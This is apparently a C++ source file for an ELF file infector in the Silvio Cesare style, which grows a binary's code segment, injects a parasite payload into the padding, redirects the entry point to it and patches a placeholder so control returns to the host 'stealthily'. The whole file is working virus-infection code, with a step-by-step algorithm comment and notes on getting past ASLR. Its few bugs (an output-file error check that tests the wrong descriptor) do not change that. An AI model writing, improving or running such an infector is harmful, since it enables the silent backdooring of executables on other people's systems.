#include <elf.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>
#include <cstring>
#include <iostream>

#include "common/hex_dump.hh"

void silvio_infect(char* host_mapping, uint64_t host_size,
                   char* parasite_mapping, uint64_t parasite_size);

int main(int argc, char** argv) {
  if (argc != 4) {
    printf("[*] Usage %s <host> <payload> <virus>\n", argv[0]);
    printf("\thost: the elf to be infected\n");
    printf("\tpayload: the payload that will be added to the host\n");
    printf("\toutput the infected output\n");
    exit(EXIT_FAILURE);
  }

  struct stat s;
  int fd_e = open(argv[1], O_RDONLY);
  if (-1 == fd_e) {
    std::cout << "failed open elf: " << std::strerror(errno) << '\n';
  }
  int fd_p = open(argv[2], O_RDONLY);
  if (-1 == fd_p) {
    std::cout << "failed open para: " << std::strerror(errno) << '\n';
  }
  int fd_o = open(argv[3], O_CREAT | O_RDWR, S_IRWXU);
  if (-1 == fd_p) {
    std::cout << "failed open para: " << std::strerror(errno) << '\n';
  }
  int size_e, size_p;

  fstat(fd_e, &s);
  size_e = s.st_size;

  fstat(fd_p, &s);
  size_p = s.st_size;

  char* elf = static_cast<char*>(malloc(size_e));
  char* payload = static_cast<char*>(malloc(size_p));
  std::cout << "host size: " << size_e << "para size: " << size_p << std::endl;
  if (-1 == read(fd_e, elf, size_e)) {
    std::cout << "read elf failed: " << std::strerror(errno) << '\n';
  }
  if (-1 == read(fd_p, payload, size_p)) {
    std::cout << "read para failed: " << std::strerror(errno) << '\n';
  }
  vt::common::hex_dump(elf, size_e);
  silvio_infect(elf, size_e, payload, size_p);
  //DumpMemory(elf, size_e);
  if (-1 == write(fd_o, elf, size_e)) {
    std::cout << "write elf failed: " << std::strerror(errno) << '\n';
  }

  free(elf);
  free(payload);

  close(fd_e);
  close(fd_p);
  close(fd_o);

  return 0;
}

/********************  ALGORITHM   *********************


--- Load parasite from file into memory
1.	Get parasite_size and parasite_code addresss (location in allocated
memory)


--- Find padding_size between CODE segment and the NEXT segment after CODE
segment 2.	CODE segment : increase
                -> p_filesz 		(by parasite size)
                -> p_memsz 			(by parasite size)
        Get and Set respectively,
        padding_size 	= (offset of next segment (after CODE segment)) - (end
of CODE segment) parasite_offset = (end of CODE segment) or (end of last section
of CODE segment)


---	PATCH Host entry point
3.	Save original_entry_point (e_entry) and replace it with parasite_offset


--- PATCH SHT
4.  Find the last section in CODE Segment and increase -
        -> sh_size          (by parasite size)


--- PATCH Parasite offset
5.	Find and replace Parasite jmp exit addresss with original_entry_point
0x????????


---	Inject Parasite to Host @ host_mapping
6.	Inject parasite code to (host_mapping + parasite_offset)


7.	Write infection to disk x_x

*/

struct ElfInfo {
  uint64_t padding_size;
  Elf64_Off code_segment_end_offset;
  Elf64_Off parasite_offset;
  Elf64_Addr parasite_load_address;
};

// Finds the placeholder (for address where our parasite code will jump after
// executing its body) and writes the host's entry point (original entry point
// address) to it. This should silently transfer the code flow to the original
// intended code after the parasite body executes.
void FindAndReplace(char* parasite, uint64_t size, long find_value,
                    long replace_value) {
  char* ptr = parasite;

  for (auto i = 0u; i < size; ++i) {
    long current_QWORD = *((long*)(ptr + i));

    if (!(find_value ^ current_QWORD)) {
      *((long*)(ptr + i)) = replace_value;
      std::cout << "replacing entry to " << std::hex << replace_value;
      return;
    }
  }
}

// Patch SHT (i.e. find the last section of CODE segment and increase its size
// by parasite_size)
void PatchSHT(char* host_mapping, uint64_t parasite_size,
              Elf64_Off code_segment_end_offset) {
  Elf64_Ehdr* elf_header = (Elf64_Ehdr*)host_mapping;

  Elf64_Off sht_offset = elf_header->e_shoff;
  uint16_t sht_entry_count = elf_header->e_shnum;
  Elf64_Off current_section_end_offset;

  // Point shdr (Pointer to iterate over SHT) to the last entry of SHT
  Elf64_Shdr* section_entry = (Elf64_Shdr*)(host_mapping + sht_offset);

  int i;
  for (i = 0; i < sht_entry_count; ++i) {
    current_section_end_offset =
        section_entry->sh_offset + section_entry->sh_size;

    if (code_segment_end_offset == current_section_end_offset) {
      // This is the last section of CODE Segment
      // Increase the sizeof this section by a parasite_size to accomodate
      // parasite
      section_entry->sh_size = section_entry->sh_size + parasite_size;
      return;
    }
    // Move to the next section entry
    ++section_entry;
  }
}

// Returns gap size (accomodation for parasite code in padding between CODE
// segment and next segment after CODE segment) padding size,
// code_segment_end_offset, parasite_offset, parasite_load_address
ElfInfo get_info(char* host_mapping, uint64_t parasite_size) {
  Elf64_Ehdr* elf_header = (Elf64_Ehdr*)host_mapping;
  uint16_t pht_entry_count = elf_header->e_phnum;
  Elf64_Off pht_offset = elf_header->e_phoff;
  Elf64_Off code_segment_end_offset = 0;
  Elf64_Off parasite_offset = 0;
  Elf64_Addr parasite_load_address;

  // Point to first entry in PHT
  Elf64_Phdr* phdr_entry = (Elf64_Phdr*)(host_mapping + pht_offset);

  // Parse PHT entries
  uint16_t CODE_SEGMENT_FOUND = 0;
  std::cout << "pht_entry_count " << pht_entry_count << std::endl;
  for (int i = 0; i < pht_entry_count; ++i) {
    std::cout << "pht entry " << i << std::endl;
    // PF_X	(1 << 0)
    // PF_W	(1 << 1)
    // PF_R (1 << 2)
    // Find the CODE Segment (containing .text section)
    if (CODE_SEGMENT_FOUND == 0 && phdr_entry->p_type == PT_LOAD &&
        phdr_entry->p_flags == (PF_R | PF_X)) {
      std::cout << "found code segment" << std::endl;
      CODE_SEGMENT_FOUND = 1;

      // Calculate the offset where the code segment ends to bellow calculate
      // padding_size
      code_segment_end_offset = phdr_entry->p_offset + phdr_entry->p_filesz;
      parasite_offset = code_segment_end_offset;
      parasite_load_address = phdr_entry->p_vaddr + phdr_entry->p_filesz;
      std::cout << "code_segment_end_offset " << std::hex<<code_segment_end_offset
                << std::endl;
      std::cout << "parasite_offset " << std::hex<<parasite_offset << std::endl;
      std::cout << "parasite_load_address " << std::hex<<parasite_load_address
                << std::endl;

      // Increase its p_filesz and p_memsz by parasite_size (to accomodate
      // parasite)
      phdr_entry->p_filesz = phdr_entry->p_filesz + parasite_size;
      phdr_entry->p_memsz = phdr_entry->p_memsz + parasite_size;
    }

    // Find next segment after CODE Segment and calculate padding size
    if (CODE_SEGMENT_FOUND == 1 && phdr_entry->p_type == PT_LOAD &&
        phdr_entry->p_flags == (PF_R | PF_W)) {
      // Return padding_size (maximum size of parasite that host can accomodate
      // in its padding between the end of CODE segment and start of next
      // loadable segment)
      std::cout << "padding_size " << phdr_entry->p_offset - parasite_offset
                << std::endl;
      return ElfInfo{.padding_size = phdr_entry->p_offset - parasite_offset,
                     .code_segment_end_offset = code_segment_end_offset,
                     .parasite_offset = parasite_offset,
                     .parasite_load_address = parasite_load_address};
    }

    ++phdr_entry;
  }

  return {};
}

void silvio_infect(char* host_mapping, uint64_t host_size,
                   char* parasite_mapping, uint64_t parasite_size) {
  int HOST_IS_EXECUTABLE = 0;       // Host is LSB Executable
  int HOST_IS_SHARED_OBJECT = 0;    // Host is a Shared Object
  Elf64_Addr original_entry_point;  // Host entry point

  // Identify the binary & SKIP Relocatable, files and 32-bit class of binaries
  Elf64_Ehdr* host_header = (Elf64_Ehdr*)host_mapping;
  if (host_header->e_type == ET_REL || host_header->e_type == ET_CORE)
    return;
  else if (host_header->e_type == ET_EXEC) {
    HOST_IS_EXECUTABLE = 1;
    HOST_IS_SHARED_OBJECT = 0;
    std::cout << "host is executable" << std::endl;
  } else if (host_header->e_type == ET_DYN) {
    HOST_IS_SHARED_OBJECT = 1;
    HOST_IS_EXECUTABLE = 0;
    std::cout << "host is SO" << std::endl;
  }
  if (host_header->e_ident[EI_CLASS] == ELFCLASS32) return;

  // Get Home size (in bytes) of parasite residence in host
  // and check if host's home size can accomodate a parasite this big in size
  ElfInfo info = get_info(host_mapping, parasite_size);

  if (info.padding_size < parasite_size) {
    fprintf(stderr,
            "[+] Host cannot accomodate parasite, parasite is angry x_x \n");
    return;
  }

  // Save original_entry_point of host and patch host entry point with
  // parasite_offset
  original_entry_point = host_header->e_entry;
  std::cout << "original entry " << std::hex << host_header->e_entry;
  if (HOST_IS_EXECUTABLE)
    host_header->e_entry = info.parasite_load_address;
  else if (HOST_IS_SHARED_OBJECT)
    host_header->e_entry = info.parasite_offset;

  std::cout << "new entry " << std::hex << host_header->e_entry;
  // Patch SHT
  PatchSHT(host_mapping, parasite_size, info.code_segment_end_offset);

  // ?????????????????????????????????????????????????????????????????????????????????????????????
  // Patch Parasite jmp-on-exit address. This step causing SIGSEGV. Since nearly
  // all binaries are in the form of shared objects (which uses offsets instead
  // of absolute addresses), we need to figure out the runtime address (rather
  // than offset) of the first instruction the host originally intended to
  // execute at RUNTIME. This has to be calculated by our parasite code at
  // RUNTIME since all modern systems come with mitigation called ASLR due to
  // which the binary has a different runtime address each time it is loaded
  // into memory. POSSIBLE Solution -  Parasite should include code that figures
  // out what base address is the
  //						binary alloted at runtime so that it transfers
  //the code back to the host stealthily.
  FindAndReplace(parasite_mapping, parasite_size, 0xAAAAAAAAAAAAAAAA,
                 original_entry_point);

  // ????????????????????????????????????????????????????????????????????????????????????????????

  // Inject parasite in Host
  memcpy((host_mapping + info.parasite_offset), parasite_mapping,
         parasite_size);
  fprintf(stdout, "[+] Infected x_x\n");
}
